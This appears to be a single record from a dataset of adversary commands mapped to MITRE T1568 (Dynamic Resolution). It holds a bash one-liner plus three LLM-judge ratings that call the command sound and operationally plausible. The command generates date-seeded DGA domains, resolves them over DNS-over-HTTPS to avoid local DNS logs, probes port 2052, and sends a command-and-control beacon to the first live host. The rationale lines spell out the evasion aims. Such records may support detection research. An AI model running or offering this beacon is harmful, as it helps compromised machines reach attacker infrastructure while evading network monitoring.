command: SEED="eta"; CANDS=(); for i in $(seq 1 3); do CANDS+=("$(printf "%s" "${SEED}$(date -u +%Y%m%d)$i" | sha256sum | cut -c1-12).telemetry-sync.cc"); done; for FQDN in "${CANDS[@]}"; do if curl -sSfI --doh-url https://dns.quad9.net/dns-query --connect-timeout 2 "https://${FQDN}:2052/ping"; then curl -sS --doh-url https://dns.quad9.net/dns-query "https://${FQDN}:2052/beacon?rnd=$RANDOM"; break; fi; done
explanation: Produces several DGA candidates, uses DoH against Quad9 to test reachability, and then communicates over port 2052 to blend with atypical TLS traffic.
rationale_steps: Resolve via DoH to avoid local DNS logs
Probe for a live endpoint on port 2052
Send beacon once an endpoint responds

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes, proper variable assignments, correct array usage, appropriate command separators, valid flags for curl, and proper loop constructs.
llm_judgments.semantic_justification: The command perfectly implements the T1568 Dynamic Resolution technique by generating domain names algorithmically (DGA-like behavior) based on a seed and date, using DoH to resolve them, testing connectivity, and establishing a command channel on an unusual port (2052) with randomized beacon parameters.

llm_judgments.syntactic_justification: The command is perfectly well-formed, using correct bash syntax for variable assignment, array manipulation, loops, command substitution, and valid `curl` flags with proper quoting.
llm_judgments.semantic_justification: The command precisely implements Dynamic Resolution (T1568) by generating daily DGA candidates, using DoH for stealthy resolution, attempting to connect on a non-standard TLS port (2052) for blending, and performing a beacon after successful connection, all of which are operationally plausible adversary behaviors.

llm_judgments.syntactic_justification: Bash arrays, loops, and parameter expansion are correct with balanced quoting and separators, and curl flags (including --doh-url, -sSfI) are valid and properly used.
llm_judgments.semantic_justification: It algorithmically generates date-based DGA-style FQDNs, uses DoH to resolve/test reachability, and then beacons over a nonstandard TLS port, aligning well with T1568 Dynamic Resolution.
